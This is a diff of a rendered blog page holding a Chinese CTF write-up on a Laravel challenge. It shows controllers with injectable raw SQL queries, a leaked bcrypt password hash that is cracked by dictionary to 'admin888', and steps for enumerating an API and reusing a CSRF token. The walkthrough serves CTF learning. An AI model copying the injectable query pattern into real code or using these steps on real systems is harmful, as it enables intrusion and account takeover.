 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">HomeController</span> <span class="k">extends</span> <span class="nx">Controller</span>
-<span class="p">{</span>
-    <span class="sd">/**
-</span><span class="sd">     * Create a new controller instance.
-</span><span class="sd">     *
-</span><span class="sd">     * @return void
-</span><span class="sd">     */</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">middleware</span><span class="p">(</span><span class="s1">&#39;auth&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="sd">/**
-</span><span class="sd">     * Show the application dashboard.
-</span><span class="sd">     *
-</span><span class="sd">     * @return \Illuminate\Contracts\Support\Renderable
-</span><span class="sd">     */</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">sendme</span><span class="p">(</span><span class="nv">$postid</span><span class="p">,</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$message</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">);</span>
-	    <span class="nv">$temp</span><span class="o">=</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;temp&#39;</span><span class="p">)</span> <span class="o">??</span> <span class="s2">&#34;nop&#34;</span><span class="p">;</span>
-	    <span class="nv">$insert</span> <span class="o">=</span> <span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;sendme&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span>
-                <span class="p">[</span>
-                    <span class="s1">&#39;number&#39;</span> <span class="o">=&gt;</span> <span class="nv">$postid</span><span class="p">,</span>
-		            <span class="s1">&#39;content&#39;</span> <span class="o">=&gt;</span> <span class="nv">$message</span><span class="p">,</span>
-		            <span class="s1">&#39;temp&#39;</span><span class="o">=&gt;</span><span class="nv">$temp</span>
-                <span class="p">]</span>
-            <span class="p">]);</span>
-	    <span class="k">if</span><span class="p">(</span><span class="nv">$insert</span><span class="p">){</span>
-    		<span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;send success&#39;);&lt;/script&gt;&#34;</span><span class="p">;</span>
-	    <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">viewed</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
-    <span class="p">{</span>
-   	<span class="nv">$viewsd</span> <span class="o">=</span> <span class="nx">DB</span><span class="o">::</span><span class="na">select</span><span class="p">(</span><span class="s2">&#34;select * from sendme where number = &#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">&#39;meview&#39;</span><span class="p">,[</span><span class="s1">&#39;views&#39;</span><span class="o">=&gt;</span><span class="nv">$viewsd</span><span class="p">]);</span>
-    <span class="p">}</span>
-
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">HomeController</span> <span class="k">extends</span> <span class="nx">Controller</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * Create a new controller instance.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     *
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @return void
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">middleware</span><span class="p">(</span><span class="s1">&#39;auth&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * Show the application dashboard.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     *
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @return \Illuminate\Contracts\Support\Renderable
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">sendme</span><span class="p">(</span><span class="nv">$postid</span><span class="p">,</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$message</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	    <span class="nv">$temp</span><span class="o">=</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;temp&#39;</span><span class="p">)</span> <span class="o">??</span> <span class="s2">&#34;nop&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	    <span class="nv">$insert</span> <span class="o">=</span> <span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;sendme&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">                <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;number&#39;</span> <span class="o">=&gt;</span> <span class="nv">$postid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		            <span class="s1">&#39;content&#39;</span> <span class="o">=&gt;</span> <span class="nv">$message</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		            <span class="s1">&#39;temp&#39;</span><span class="o">=&gt;</span><span class="nv">$temp</span>
+</span></span><span class="line"><span class="cl">                <span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span><span class="p">(</span><span class="nv">$insert</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    		<span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;send success&#39;);&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">viewed</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   	<span class="nv">$viewsd</span> <span class="o">=</span> <span class="nx">DB</span><span class="o">::</span><span class="na">select</span><span class="p">(</span><span class="s2">&#34;select * from sendme where number = &#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="nx">view</span><span class="p">(</span><span class="s1">&#39;meview&#39;</span><span class="p">,[</span><span class="s1">&#39;views&#39;</span><span class="o">=&gt;</span><span class="nv">$viewsd</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>需要经过鉴权，而我们又不知道email和password，所以只能从<code>api.php</code>提供的check路由入手，查看CheckController控制器了解路由功能</p>
 <div class="highlight"><div class="chroma">
@@ -584,15 +584,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">CheckController</span> <span class="k">extends</span> <span class="nx">Controller</span>
-<span class="p">{</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$users</span> <span class="o">=</span> <span class="nx">DB</span><span class="o">::</span><span class="na">select</span><span class="p">(</span><span class="s2">&#34;select * from users where id = </span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">);</span>
-        <span class="k">return</span> <span class="nv">$users</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CheckController</span> <span class="k">extends</span> <span class="nx">Controller</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$users</span> <span class="o">=</span> <span class="nx">DB</span><span class="o">::</span><span class="na">select</span><span class="p">(</span><span class="s2">&#34;select * from users where id = </span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$users</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>提供了用户查询功能，那么登陆用到的账号密码就可以从这里获取。</p>
 <p>参考<a href="https://laravelacademy.org/post/21970" target="_blank" rel="noopener">https://laravelacademy.org/post/21970</a>访问<code>/api/check/{id}</code>进行爆破，但是laravel限制api请求频率就很难受。。。所以从另一个方面开搞，laravel.log保存操作日志，从中可以找到<code>&quot;userId&quot;:1639</code>，成功获得用户信息</p>
@@ -601,8 +601,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1639</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;adminzhtt1m&#34;</span><span class="p">,</span><span class="nt">&#34;email&#34;</span><span class="p">:</span><span class="s2">&#34;adminzhtt1@aa.com&#34;</span><span class="p">,</span><span class="nt">&#34;email_verified_at&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;$2y$10$RSqYBW6k6gyBpOr6ECDZhOiC026moyKFSvA5OV2DFqUbgZonWi2gG&#34;</span><span class="p">,</span><span class="nt">&#34;remember_token&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;created_at&#34;</span><span class="p">:</span><span class="s2">&#34;2020-12-17 14:55:51&#34;</span><span class="p">,</span><span class="nt">&#34;updated_at&#34;</span><span class="p">:</span><span class="s2">&#34;2020-12-17 14:55:51&#34;</span><span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1639</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;adminzhtt1m&#34;</span><span class="p">,</span><span class="nt">&#34;email&#34;</span><span class="p">:</span><span class="s2">&#34;adminzhtt1@aa.com&#34;</span><span class="p">,</span><span class="nt">&#34;email_verified_at&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;$2y$10$RSqYBW6k6gyBpOr6ECDZhOiC026moyKFSvA5OV2DFqUbgZonWi2gG&#34;</span><span class="p">,</span><span class="nt">&#34;remember_token&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;created_at&#34;</span><span class="p">:</span><span class="s2">&#34;2020-12-17 14:55:51&#34;</span><span class="p">,</span><span class="nt">&#34;updated_at&#34;</span><span class="p">:</span><span class="s2">&#34;2020-12-17 14:55:51&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>但是password是加密过的，所以拼字典的时候到了，密码是<code>admin888</code></p>
 <p>登陆进去后通过send按钮先发一发，获得token，复制下来另外POST传<code>sendmessage/{postid}</code>，否则会因为laravel的安全机制报419错误。不过后面我sendmessage过去报500，本地试了post是正常的，所以错误应该是发生在数据库insert阶段，也不知道是我的问题还是环境的问题，还是等等有没有师傅做出来吧。。。</p>
